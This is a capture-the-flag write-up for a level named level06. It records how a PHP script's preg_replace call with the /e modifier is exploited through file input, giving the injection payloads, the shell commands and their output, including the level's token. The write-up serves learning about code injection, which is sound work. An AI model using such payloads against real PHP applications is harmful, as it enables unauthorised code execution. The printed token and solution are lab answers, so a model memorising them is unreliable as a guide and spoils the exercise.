Level06:

- Initial discovery:
  Ran: ls -l
  Output:
  - Found a SUID binary and a PHP script:
    -rwsr-x---+ 1 flag06 level06 level06
    -rwxr-x---  1 flag06 level06 level06.php

- Ran: strings ./level06
  Output:
  - Revealed it executes: /usr/bin/php /home/user/level06/level06.php <input>

- Insight:
  Although owned by flag06, the binary drops privileges using setresuid() before launching PHP.
  So, the PHP script runs as level06 — not flag06.

- Examined level06.php:
  Key vulnerable line:
    preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  - Deprecated `/e` modifier means code injection is possible via file input.

- Attempted code injection:
  Payload:
    echo '[x system("getflag")]' > /tmp/exploit.txt
    ./level06 /tmp/exploit.txt
  Output:
    "No token for you" — confirmed `getflag` ran as level06.

- Final exploit used variable interpolation to leak the flag:
  Payload:
    echo '[x ${`getflag`}]' > /tmp/exploit.txt
    ./level06 /tmp/exploit.txt
  Output:
    PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub

- Explanation:
  - `preg_replace(.../e...)` evaluates PHP code.
  - `` `getflag` `` executes shell command inside PHP.
  - `${...}` causes PHP to attempt accessing a variable with that name.
  - PHP throws a notice because the variable doesn't exist — revealing the flag in the message.

Code Injection

Command Substitution

Variable Variable Exploitation

Error Message Information Disclosure


- Final output:
  wiok45aaoguiboiki2tuin6ub  > level07

